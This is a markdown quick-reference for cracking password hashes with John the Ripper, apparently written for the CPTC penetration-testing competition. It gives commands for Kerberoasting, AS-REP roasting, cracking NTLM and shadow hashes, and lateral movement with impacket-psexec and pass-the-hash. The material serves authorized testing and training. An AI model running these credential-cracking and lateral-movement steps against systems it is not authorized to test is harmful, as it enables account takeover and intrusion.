# John the Ripper - CPTC Quick Reference

## What is John & Why It's Critical

**John the Ripper = Password hash cracker**

**Why you need it for CPTC:**
- ✅ Crack hashes obtained from compromised systems
- ✅ Turn hashes into usable passwords
- ✅ Escalate privileges with cracked service accounts
- ✅ Works with 100+ hash types
- ✅ Free alternative to paid tools

**Reality Check:**
- Weak passwords: **Seconds to minutes**
- Medium passwords: **Minutes to hours**
- Strong passwords: **Won't crack in CPTC timeframe**

**Strategy:** Crack for max 5-10 minutes, then move on

---

## Installation (One-Time)

```bash
# Kali (pre-installed)
john --version

# If missing:
sudo apt install john

# Jumbo version (supports more hash types)
sudo apt install john-jumbo

# Verify
john --list=formats | head -20
```

---

## Core Concept - How John Works

```
Hashes → John → Wordlist/Rules → Cracked Passwords
```

**Process:**
1. Feed John hash file
2. John tries passwords from wordlist
3. Hashes each password attempt
4. Compares with target hash
5. Match = Password cracked!

**Speed depends on:**
- Hash algorithm (MD5 fast, bcrypt slow)
- CPU power (more cores = faster)
- Wordlist size
- Password complexity

---

## Quick Start - 3 Essential Commands

### 1. Auto-Detect & Crack (Easiest)

```bash
# John auto-detects hash type and cracks
john hashes.txt

# Shows progress:
# 0g 0:00:00:05 DONE (2025-10-24 18:33) 0g/s 1234Kp/s 1234Kc/s
# Session completed
```

**Use when:** Not sure what hash type, just want to try

---

### 2. Dictionary Attack with Wordlist (Most Common)

```bash
# Use rockyou.txt (most popular wordlist)
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# With rules (word mangling)
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt
```

**Rules do:** password → Password, password123, p@ssword, etc.

**Time:**
- rockyou.txt: ~14 million passwords
- Fast hash (MD5): 1-2 minutes
- Slow hash (bcrypt): 10+ minutes

---

### 3. Show Cracked Passwords (View Results)

```bash
# Display cracked passwords
john --show hashes.txt

# Output:
# user1:password123
# user2:Welcome2024!
# 
# 2 password hashes cracked, 5 left
```

**Always run after cracking to see results**

---

## Hash Type Detection & Specification

### Let John Auto-Detect (Usually Works)

```bash
john hashes.txt
# John identifies hash type automatically
```

---

### Manually Specify Format (Faster, More Accurate)

```bash
# List all supported formats
john --list=formats

# Common formats for CPTC:
john --format=NT hashes.txt           # NTLM (Windows)
john --format=raw-md5 hashes.txt      # MD5
john --format=raw-sha1 hashes.txt     # SHA1
john --format=raw-sha256 hashes.txt   # SHA256
john --format=bcrypt hashes.txt       # bcrypt
john --format=krb5tgs hashes.txt      # Kerberos TGS (Kerberoasting)
john --format=krb5asrep hashes.txt    # Kerberos AS-REP roasting
john --format=netntlmv2 hashes.txt    # NTLMv2
```

**Why specify format:**
- Faster (skips detection)
- More accurate (avoids misdetection)

---

## CPTC Workflows by Scenario

### Scenario 1: Kerberoasting (Most Common)

**You have:** Kerberos TGS hashes from GetUserSPNs.py

```bash
# 1. Get hashes
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 'CORP/user:pass' -outputfile spn-hashes.txt

# Output in spn-hashes.txt:
# $krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/SQL01*$abc123...

# 2. Crack with John
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt spn-hashes.txt

# 3. Check results
john --show --format=krb5tgs spn-hashes.txt

# Output:
# $krb5tgs$23$*sqlservice$...:SQLPass123!
# 1 password hash cracked, 0 left

# 4. Use cracked password
impacket-psexec 'CORP/sqlservice:SQLPass123!@SQL-SERVER'
```

**Time: 1-5 minutes for weak passwords**

---

### Scenario 2: AS-REP Roasting

**You have:** AS-REP hashes from GetNPUsers.py

```bash
# 1. Get hashes
impacket-GetNPUsers CORP/ -usersfile users.txt -dc-ip 10.10.10.10 -format john -outputfile asrep-hashes.txt

# 2. Crack
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep-hashes.txt

# 3. Show results
john --show --format=krb5asrep asrep-hashes.txt
```

---

### Scenario 3: NTLM Hashes (Windows)

**You have:** NTLM hashes from secretsdump or Mimikatz

```bash
# Hash format: Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# 1. Extract NT hash (last part before :::)
# 8846f7eaee8fb117ad06bdd830b7586c

# 2. Save to file:
echo "Administrator:8846f7eaee8fb117ad06bdd830b7586c" > ntlm-hashes.txt

# 3. Crack
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm-hashes.txt

# 4. Show
john --show --format=NT ntlm-hashes.txt
```

---

### Scenario 4: Linux /etc/shadow Hashes

**You have:** /etc/shadow file from compromised Linux system

```bash
# shadow file format:
# user:$6$salt$hash:18500:0:99999:7:::

# 1. Extract user and hash to file
grep -v '^\*' /path/to/shadow > shadow-hashes.txt

# 2. Crack (John auto-detects SHA512)
john --wordlist=/usr/share/wordlists/rockyou.txt shadow-hashes.txt

# 3. Show
john --show shadow-hashes.txt
```

---

### Scenario 5: Web App MD5/SHA Hashes

**You have:** Hashes from database dump (SQLi)

```bash
# Example hashes:
# 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 of "password")
# 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 (SHA1 of "password")

# Save to file:
echo "5f4dcc3b5aa765d61d8327deb882cf99" > web-hashes.txt

# Crack MD5
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt web-hashes.txt

# Show
john --show --format=raw-md5 web-hashes.txt
```

---

## Wordlists - Which to Use

### Default Location (Kali)

```bash
ls /usr/share/wordlists/
# rockyou.txt.gz  ← DECOMPRESS FIRST!

# Decompress rockyou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

### Wordlist Priority for CPTC

| Wordlist | Size | Use When | Time |
|----------|------|----------|------|
| **rockyou.txt** | 14M passwords | Always try first | 1-5 min |
| **darkweb2017-top10000.txt** | 10K passwords | Very fast, common passwords | 5-10 sec |
| **fasttrack.txt** | 222 passwords | Ultra-fast | 1-2 sec |
| **SecLists/Passwords/** | Various | Targeted attacks | Varies |

---

### Quick Wordlist Tests

```bash
# Try top 10K passwords (very fast)
john --wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt hashes.txt

# Try fasttrack (ultra fast)
john --wordlist=/usr/share/wordlists/fasttrack.txt hashes.txt

# If those fail, go to rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Strategy:** Try small wordlists first (seconds), then larger ones

---

## Advanced Options

### Rules (Word Mangling)

**What rules do:**
```
password → Password (capitalize)
password → password123 (add numbers)
password → p@ssword (leet speak)
password → password! (add special chars)
```

**Enable rules:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# Specific rule set
john --wordlist=wordlist.txt --rules=Jumbo hashes.txt
```

**Trade-off:**
- ✅ Increases crack rate (tries variations)
- ❌ Takes longer (more attempts per word)

**CPTC Recommendation:** Use if basic wordlist fails and you have time

---

### Incremental Mode (Brute Force)

**What it does:** Tries all possible combinations (aaa, aab, aac...)

```bash
# Brute force (WARNING: VERY SLOW)
john --incremental hashes.txt

# Limit to specific charset
john --incremental=Digits hashes.txt  # 0-9 only
john --incremental=LowerNum hashes.txt  # a-z, 0-9
```

**Time:** Can take days/weeks for anything > 8 characters

**CPTC:** Usually skip unless hash is critical and you have spare time

---

### Show Statistics

```bash
# Show cracking status
john --status

# Output:
# Session Name:      hashes
# Cracked:           2/10 (20.00%)
# Time running:      0:05:32
# Speed:             1234K c/s
```

---

### Session Management

```bash
# John saves progress automatically
# Stop with Ctrl+C, resume later:

# Resume session
john --restore

# Or resume specific session
john --restore=session-name
```

**Useful when:** Starting long crack, need to stop, resume later

---

## Hash Identification Tools

**Before John, identify hash type:**

### hashid (Kali pre-installed)

```bash
# Identify hash type
hashid 'hash-string-here'

# Example:
hashid '5f4dcc3b5aa765d61d8327deb882cf99'

# Output:
# Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
# [+] MD5
# [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

---

### hash-identifier (Alternative)

```bash
hash-identifier

# Paste hash when prompted
# Shows possible hash types
```

---

### Online Tools (When Offline Tools Fail)

- https://hashes.com/en/tools/hash_identifier
- https://www.tunnelsup.com/hash-analyzer/

**Note:** Don't submit real engagement hashes to online services!

---

## Common Hash Formats Quick Reference

| Hash Type | Example | John Format | Common Source |
|-----------|---------|-------------|---------------|
| **NTLM** | 8846f7eaee8fb117ad06bdd830b7586c | `NT` | Windows SAM, secretsdump |
| **MD5** | 5f4dcc3b5aa765d61d8327deb882cf99 | `raw-md5` | Web apps, old systems |
| **SHA1** | 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 | `raw-sha1` | Web apps |
| **SHA256** | 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 | `raw-sha256` | Modern web apps |
| **bcrypt** | $2a$10$... | `bcrypt` | Modern secure apps |
| **Kerberos TGS** | $krb5tgs$23$... | `krb5tgs` | Kerberoasting |
| **Kerberos AS-REP** | $krb5asrep$23$... | `krb5asrep` | AS-REP roasting |
| **Linux SHA512** | $6$salt$... | Auto-detect | /etc/shadow |
| **NTLMv2** | user::domain:challenge:response | `netntlmv2` | Responder, ntlmrelayx |

---

## Time Expectations

### Fast Hashes (MD5, NTLM, SHA1)

```
Wordlist: rockyou.txt (14M passwords)
Hardware: Modern CPU (8 cores)

Expected speed: 10-100M hashes/second
Time: 1-5 minutes
```

---

### Medium Hashes (SHA256, SHA512)

```
Expected speed: 1-10M hashes/second
Time: 5-15 minutes
```

---

### Slow Hashes (bcrypt, PBKDF2, Argon2)

```
Expected speed: 100-10K hashes/second
Time: 30 minutes to hours
```

**CPTC Strategy:** If bcrypt/Argon2, set cracking in background, move on

---

## CPTC Time Management

### Decision Tree

```
Got hashes?
├─ Fast hash (NTLM, MD5)?
│   └─ Crack with rockyou.txt (5 min max)
│       ├─ Cracked? → Use password
│       └─ Not cracked? → Move on
│
├─ Medium hash (SHA256)?
│   └─ Try top 10K wordlist (30 sec)
│       ├─ Cracked? → Use password
│       └─ Not cracked? → Move on or background
│
└─ Slow hash (bcrypt)?
    └─ Start cracking in background
    └─ Continue with other attacks
```

---

### Parallel Cracking Strategy

```bash
# Terminal 1: Kerberoasting
john --format=krb5tgs --wordlist=rockyou.txt spn-hashes.txt &

# Terminal 2: NTLM hashes
john --format=NT --wordlist=rockyou.txt ntlm-hashes.txt &

# Terminal 3: Continue enumeration/exploitation

# Check progress periodically:
john --show --format=krb5tgs spn-hashes.txt
john --show --format=NT ntlm-hashes.txt
```

---

## Performance Optimization

### Use All CPU Cores

```bash
# John automatically uses available cores
# Check usage:
top
# Look for "john" process at ~100% × number of cores
```

---

### Fork (Parallel Processing)

```bash
# Run multiple John instances (advanced)
john --fork=4 --wordlist=rockyou.txt hashes.txt

# Uses 4 parallel processes
# Faster on multi-core systems
```

---

### GPU Acceleration (If Available)

```bash
# Check for GPU support
john --list=opencl-devices

# Use GPU
john --format=raw-md5-opencl --wordlist=rockyou.txt hashes.txt

# Much faster for supported formats (10-100x speedup)
```

**Note:** Most CPTC VMs don't have GPU access

---

## Evidence Collection

**For cracked passwords, document:**

1. **Hash obtained:**
```
$krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/SQL01*$abc...
```

2. **Command used:**
```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt spn-hashes.txt
```

3. **Result:**
```
$krb5tgs$23$*sqlservice$...:SQLPass123!
Session completed.
```

4. **Impact:**
```
Service account 'sqlservice' password cracked: SQLPass123!
Account has admin rights on SQL01, SQL02, SQL03.
Credentials used to compromise database servers.
```

**Time: 30 seconds**

---

## Common Errors & Fixes

### Error: "No password hashes loaded"

**Cause:** Wrong hash format or empty file

**Fix:**
```bash
# Check file content
cat hashes.txt

# Ensure proper format (no extra characters)
# Try specifying format manually
john --format=NT hashes.txt
```

---

### Error: "No such file or directory: /usr/share/wordlists/rockyou.txt"

**Cause:** File is compressed

**Fix:**
```bash
# Decompress
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Verify
ls -lh /usr/share/wordlists/rockyou.txt
```

---

### Very Slow Cracking

**Cause:** Slow hash algorithm or large wordlist

**Fix:**
```bash
# Try smaller wordlist first
john --wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt hashes.txt

# Check hash type (bcrypt is intentionally slow)
# May need to leave running in background
```

---

## John vs Hashcat

**John the Ripper:**
- ✅ Pre-installed on Kali
- ✅ Easier syntax
- ✅ Good for CPU cracking
- ❌ Slower than Hashcat
- ❌ Less GPU optimization

**Hashcat:**
- ✅ Faster (especially with GPU)
- ✅ Better performance
- ❌ More complex syntax
- ❌ May need installation

**CPTC Recommendation:**
- Use John for quick cracks (< 5 min)
- Use Hashcat if John fails and you have time
- Both work, use what you know

---

## Quick Command Reference

```bash
# Auto-detect and crack
john hashes.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# With rules
john --wordlist=rockyou.txt --rules hashes.txt

# Specify format
john --format=NT hashes.txt
john --format=krb5tgs hashes.txt
john --format=raw-md5 hashes.txt

# Show cracked
john --show hashes.txt
john --show --format=NT hashes.txt

# Check status
john --status

# Resume
john --restore

# List formats
john --list=formats
```

---

## Integration with Other Tools

### John + Impacket (Kerberoasting)

```bash
# 1. Get hashes
impacket-GetUserSPNs -request 'CORP/user:pass' -dc-ip 10.10.10.10 -outputfile spn.txt

# 2. Crack
john --format=krb5tgs --wordlist=rockyou.txt spn.txt

# 3. Use password
john --show --format=krb5tgs spn.txt
# Output: $krb5tgs$...:CrackedPassword123!

impacket-psexec 'CORP/serviceaccount:CrackedPassword123!@TARGET'
```

---

### John + Mimikatz (NTLM Hashes)

```bash
# 1. Mimikatz dumps hash
# NTLM: 8846f7eaee8fb117ad06bdd830b7586c

# 2. Crack with John
echo "user:8846f7eaee8fb117ad06bdd830b7586c" > hash.txt
john --format=NT --wordlist=rockyou.txt hash.txt

# 3. Use cracked password
# Or just use the hash (Pass-the-Hash)
impacket-psexec -hashes ':8846f7eaee8fb117ad06bdd830b7586c' 'user@TARGET'
```

---

### John + Web App SQLi (Database Hashes)

```bash
# 1. SQLi extracts hashes from database
# SELECT username, password FROM users;
# admin:5f4dcc3b5aa765d61d8327deb882cf99

# 2. Identify hash type
hashid 5f4dcc3b5aa765d61d8327deb882cf99
# MD5

# 3. Crack
echo "5f4dcc3b5aa765d61d8327deb882cf99" > web-hashes.txt
john --format=raw-md5 --wordlist=rockyou.txt web-hashes.txt

# 4. Login to web app with cracked password
```

---

## Final Tips for CPTC

**Speed Optimization:**
1. Try fast wordlist first (10K passwords) - 30 seconds
2. If fails, try rockyou.txt - 5 minutes max
3. If still failing, move on (don't waste time)

**Background Cracking:**
```bash
# Start crack, background it
john --wordlist=rockyou.txt hashes.txt > /tmp/john.log 2>&1 &

# Continue other attacks
# Check periodically:
john --show hashes.txt
```

**Priority:**
1. Kerberos hashes (TGS, AS-REP) - often weak passwords
2. NTLM hashes - common in Windows environments
3. Web app hashes (MD5, SHA1) - often old/weak
4. bcrypt/modern hashes - usually skip (too slow)

**Reality Check:**
- Most CPTC passwords won't crack
- Focus on weak/old service accounts
- 5-10 minutes max per hash type
- If not cracking, use hash directly (Pass-the-Hash)

**CPTC Workflow:**
```
1. Obtain hashes (Mimikatz, secretsdump, GetUserSPNs)
2. Start John cracking in background (5 min timer)
3. Continue other exploitation
4. Check John results
5. Use cracked passwords OR use hashes (PtH)
```

**Remember:**
- ✅ Cracked password = cleaner access
- ✅ Hash without password = Pass-the-Hash still works
- ✅ Either way, you win

**Total Time Budget: 10-15 minutes for all hash cracking, then move on**
